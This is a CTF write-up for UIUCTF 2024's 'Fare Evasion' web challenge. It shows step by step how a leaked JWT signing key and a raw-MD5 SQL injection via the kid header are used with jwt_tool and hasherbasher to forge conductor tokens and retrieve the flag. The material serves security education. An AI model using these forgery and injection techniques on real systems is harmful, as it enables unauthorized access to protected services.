---
name: Fare Evasion (2024)
event: UIU CTF 2024
category: Web
description: Writeup for Fare Evasion (Web) - UIU CTF (2024) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Fare Evasion

## Description

> SIGPwny Transit Authority needs your fares, but the system is acting a tad odd. We'll let you sign your tickets this time!

## Recon

The web page is a fare collection system with two options; `I'm a Passenger` and `I'm a Conductor`, although the latter is greyed out.

![](./images/1.png)

Clicking the first option triggers a POST request to the `/pay` endpoint, which returns an error message.

{% code overflow="wrap" %}

```json
{
    "message": "Sorry passenger, only conductors are allowed right now. Please sign your own tickets. \nhashed _\bR\u00f2\u001es\u00dcx\u00c9\u00c4\u0002\u00c5\u00b4\u0012\\\u00e4 secret: a_boring_passenger_signing_key_?",
    "success": false
}
```

{% endcode %}

Checking the page source reveals the following script.

{% code overflow="wrap" %}

```js
async function pay() {
    // i could not get sqlite to work on the frontend :(
    /*
        db.each(`SELECT * FROM keys WHERE kid = '${md5(headerKid)}'`, (err, row) => {
        ???????
       */
    const r = await fetch("/pay", { method: "POST" });
    const j = await r.json();
    document.getElementById("alert").classList.add("opacity-100");
    // todo: convert md5 to hex string instead of latin1??
    document.getElementById("alert").innerText = j["message"];
    setTimeout(() => {
        document.getElementById("alert").classList.remove("opacity-100");
    }, 5000);
}
```

{% endcode %}

Finally, we have an `access_token` cookie in JWT format.

{% code overflow="wrap" %}

```bash
jwt_tool eyJhbGciOiJIUzI1NiIsImtpZCI6InBhc3Nlbmdlcl9rZXkiLCJ0eXAiOiJKV1QifQ.eyJ0eXBlIjoicGFzc2VuZ2VyIn0.EqwTzKXS85U_CbNznSxBz8qA1mDZOs1JomTXSbsw0Zs

Token header values:
[+] alg = "HS256"
[+] kid = "passenger_key"
[+] typ = "JWT"

Token payload values:
[+] type = "passenger"
```

{% endcode %}

## Solution

Putting the pieces together:

-   We have a JWT with a payload value of `passenger`, which we need to change to `conductor`
-   An error message revealed the JWT secret: `a_boring_passenger_signing_key_?`

### JWT Tampering

Looks like a [JWT attack](https://portswigger.net/web-security/jwt) - let's see if the key is correct.

{% code overflow="wrap" %}

```bash
jwt_tool eyJhbGciOiJIUzI1NiIsImtpZCI6InBhc3Nlbmdlcl9rZXkiLCJ0eXAiOiJKV1QifQ.eyJ0eXBlIjoicGFzc2VuZ2VyIn0.EqwTzKXS85U_CbNznSxBz8qA1mDZOs1JomTXSbsw0Zs -C -p a_boring_passenger_signing_key_?

Password provided, checking if valid...
[+] CORRECT key found:
a_boring_passenger_signing_key_?
You can tamper/fuzz the token contents (-T/-I) and sign it using:
python3 jwt_tool.py [options here] -S hs256 -p "a_boring_passenger_signing_key_?"
```

{% endcode %}

It is! `jwt_tool` even gave us a command to forge our own token. Let's do that now, setting the payload claim to `conductor`.

{% code overflow="wrap" %}

```bash
jwt_tool eyJhbGciOiJIUzI1NiIsImtpZCI6InBhc3Nlbmdlcl9rZXkiLCJ0eXAiOiJKV1QifQ.eyJ0eXBlIjoicGFzc2VuZ2VyIn0.EqwTzKXS85U_CbNznSxBz8qA1mDZOs1JomTXSbsw0Zs -S hs256 -p a_boring_passenger_signing_key_? -I -pc type -pv conductor

jwttool_88a3bbfda9d5113a694dfd1b61799a77 - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsImtpZCI6InBhc3Nlbmdlcl9rZXkiLCJ0eXAiOiJKV1QifQ.eyJ0eXBlIjoiY29uZHVjdG9yIn0.77TMRvz8VigLQ_7XOYV5G9gs24Wr70SmfRqTrHvDq_I
```

{% endcode %}

I swapped the cookies, but it didn't work. Maybe we need to change the `kid` header value to `conductor_key` as well 💡

{% code overflow="wrap" %}

```bash
jwt_tool eyJhbGciOiJIUzI1NiIsImtpZCI6InBhc3Nlbmdlcl9rZXkiLCJ0eXAiOiJKV1QifQ.eyJ0eXBlIjoicGFzc2VuZ2VyIn0.EqwTzKXS85U_CbNznSxBz8qA1mDZOs1JomTXSbsw0Zs -S hs256 -p a_boring_passenger_signing_key_? -I -pc type -pv conductor -hc kid -hv conductor_key

jwttool_c8c71c7208443249b969aeecbeb77c81 - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsImtpZCI6ImNvbmR1Y3Rvcl9rZXkiLCJ0eXAiOiJKV1QifQ.eyJ0eXBlIjoiY29uZHVjdG9yIn0.N8fB2NrjUYWvipOOtn1jQrn7u1XaqEGTEppgbyKBIHE
```

{% endcode %}

Hmmm.. Now it says, `Key isn't passenger or conductor. Please sign your own tickets.` which is the same message I get when signing the token with a random \[invalid\] secret.

Time to rethink! Remember the comments in the JS snippet?

{% code overflow="wrap" %}

```js
//db.each(`SELECT * FROM keys WHERE kid = '${md5(headerKid)}'`, (err, row)

// todo: convert md5 to hex string instead of latin1??
```

{% endcode %}

Pair them with the response we received from the `/pay` endpoint.

{% code overflow="wrap" %}

```
\nhashed _\bR\u00f2\u001es\u00dcx\u00c9\u00c4\u0002\u00c5\u00b4\u0012\\\u00e4 secret: a_boring_passenger_signing_key_?
```

{% endcode %}

We have already confirmed that the signing key is correct, so the first part must be the MD5 hash of the `headerKid` in raw format (rather than hex).

Let's test it; we know the passenger `kid` is `passenger_key`, so we can [MD5 it, decode from hex, and then encode in unicode format](<https://gchq.github.io/CyberChef/#recipe=MD5()From_Hex('Auto')Escape_Unicode_Characters('%5C%5Cu',false,4,true)&input=cGFzc2VuZ2VyX2tleQ>).

{% code overflow="wrap" %}

```
_\u0008R\u00F2\u001Es\u00DCx\u00C9\u00C4\u0002\u00C5\u00B4\u0012\\u00E4
```

{% endcode %}

It's a match! Let's take a step back, though. Before the unicode escaping, the raw string is `_RòsÜxÉÄÅ´\ä`. Therefore, whenever the following line executes:

{% code overflow="wrap" %}

```js
db.each(`SELECT * FROM keys WHERE kid = '${md5(headerKid)}'`, (err, row) => {
        ???????
```

{% endcode %}

It's actually executing:

{% code overflow="wrap" %}

```js
db.each(`SELECT * FROM keys WHERE kid = '${md5("_RòsÜxÉÄÅ´\ä")}'`, (err, row) => {
        ???????
```

{% endcode %}

Any thoughts?? 🧠

Maybe if the MD5 hash decoded to something like `'or 1=1--`? 🤔

{% code overflow="wrap" %}

```js
db.each(`SELECT * FROM keys WHERE kid = '${md5("'or 1=1--")}'`, (err, row) => {
        ???????
```

{% endcode %}

### SQL Injection

I'd already had a suspicion about [SQLi](https://portswigger.net/web-security/sql-injection) but wasn't sure how to accomplish it. For example, how do I find a string that, when hashed, will produce a string of hex values that, when decoded (unhexed), begins with `'or 1=1--`?

My teammate already solved the challenge and recommended a tool called [hasherbasher](https://github.com/gen0cide/hasherbasher) 💡

> This tool helps exploit poorly designed authentication systems by locating ASCII strings that, when MD5 hashed, result in raw bytes that could change SQL logic.

So, it turns out we don't need to construct a hash as precisely as I'd initially anticipated. Here's the `hasherbasher` regex: `\A.*?'(\|\||or|Or|OR|oR)'[1-9]+?.*\z`.

Providing the string `'or\d'` (where `\d` is any decimal value) exists somewhere in the raw bytes, the SQL injection should succeed. Here's the example from GitHub.

{% code overflow="wrap" %}

```bash
[HASHERBASHER:cli]  INFO ===== Match Found =====
[HASHERBASHER:cli]  INFO Cracked In: 0.000172369 seconds
[HASHERBASHER:cli]  INFO  -- BEGIN RAW BYTES --
l���%'oR'5���[
[HASHERBASHER:cli]  INFO  -- END RAW BYTES --
[HASHERBASHER:cli]  INFO ===== Results =====

 Located String: DyrhGOYP0vxI2DtH8y
    Result Size: 16
   Result Bytes: [108 14 151 253 165 194 37 39 111 82 39 53 179 129 162 91]
     Result Hex: 6c0e97fda5c225276f522735b381a25b
```

{% endcode %}

If we [MD5](<https://gchq.github.io/CyberChef/#recipe=MD5()&input=RHlyaEdPWVAwdnhJMkR0SDh5>) `DyrhGOYP0vxI2DtH8y`, we get `6c0e97fda5c225276f522735b381a25b`.

If we [decode](<https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=NmMwZTk3ZmRhNWMyMjUyNzZmNTIyNzM1YjM4MWEyNWI&oeol=FF>) `6c0e97fda5c225276f522735b381a25b` from hex, we get `lý¥Â%'oR'5³¢[`

{% code overflow="wrap" %}

```js
db.each(`SELECT * FROM keys WHERE kid = '${md5("'lý¥Â%'oR'5³¢[")}'`, (err, row) => {
        ???????
```

{% endcode %}

Why would this work? It's basically `SELECT`ing all of the `keys` from the database, `WHERE` the `kid` = `${md5("'lý¥Â%` OR `5³¢[")}`.

The first condition returns `false`, since no `kid` exists called `${md5("'lý¥Â%`.

The second condition returns `true`, since `(\d)` is [always true](https://www.sqlite.org/datatype3.html), even if it's in string format `('\d')` and followed by letters `('\d\w+')`.

To demonstrate this fact, try the following query in an online [SQLite interpreter](https://sqliteonline.com).

{% code overflow="wrap" %}

```sql
SELECT * FROM demo WHERE name = 'crypto' or 'cat';
```

{% endcode %}

It returns zero results, while this query returns all rows from the DB.

{% code overflow="wrap" %}

```sql
SELECT * FROM demo WHERE name = 'crypto' or '5cat';
```

{% endcode %}

The same applies to `MariaDB`, but `PostgreSQL` and `MSSQL` respond with an error.

Anyway, returning to our SQL statement, we have two conditions: one is true, and one is false. If we OR these results, the overall condition returns `true` (`0 || 1 = 1`), and all keys will be returned from the DB.

Time to test it out 🙂

{% code overflow="wrap" %}

```bash
jwt_tool eyJhbGciOiJIUzI1NiIsImtpZCI6InBhc3Nlbmdlcl9rZXkiLCJ0eXAiOiJKV1QifQ.eyJ0eXBlIjoicGFzc2VuZ2VyIn0.EqwTzKXS85U_CbNznSxBz8qA1mDZOs1JomTXSbsw0Zs -S hs256 -p a_boring_passenger_signing_key_? -I -pc type -pv conductor -hc kid -hv DyrhGOYP0vxI2DtH8y

jwttool_5897f616a9cbf019ed0a61e0b50a095c - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsImtpZCI6IkR5cmhHT1lQMHZ4STJEdEg4eSIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiY29uZHVjdG9yIn0.jFCtw7Xi4WzujhfDRjLMez-qEfm-al8sVpvc00Dfr4k
```

{% endcode %}

We send the request with the new token and receive all the keys in return 😎

{% code overflow="wrap" %}

```json
{
    "message": "Sorry passenger, only conductors are allowed right now. Please sign your own tickets. \nhashed \u00f4\u008c\u00f7u\u009e\u00deIB\u0090\u0005\u0084\u009fB\u00e7\u00d9+ secret: conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e\nhashed _\bR\u00f2\u001es\u00dcx\u00c9\u00c4\u0002\u00c5\u00b4\u0012\\\u00e4 secret: a_boring_passenger_signing_key_?",
    "success": false
}
```

{% endcode %}

### JWT Forgery

Now we need to forge a brand new JWT for the `conductor` using the associated key: `conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e`

{% code overflow="wrap" %}

```bash
jwt_tool eyJhbGciOiJIUzI1NiIsImtpZCI6InBhc3Nlbmdlcl9rZXkiLCJ0eXAiOiJKV1QifQ.eyJ0eXBlIjoicGFzc2VuZ2VyIn0.EqwTzKXS85U_CbNznSxBz8qA1mDZOs1JomTXSbsw0Zs -S hs256 -p conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e -I -pc type -pv conductor -hc kid -hv conductor_key

jwttool_d7c1ddf109460134a3b2f811d55a255e - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsImtpZCI6ImNvbmR1Y3Rvcl9rZXkiLCJ0eXAiOiJKV1QifQ.eyJ0eXBlIjoiY29uZHVjdG9yIn0.9YEcZgwQH46F4wckPyovNOwao49zdlEPoQ9HdiXimK4
```

{% endcode %}

Finally, we submit the request and receive the flag.

![](./images/2.png)

Flag: `uiuctf{sigpwny_does_not_condone_turnstile_hopping!}`
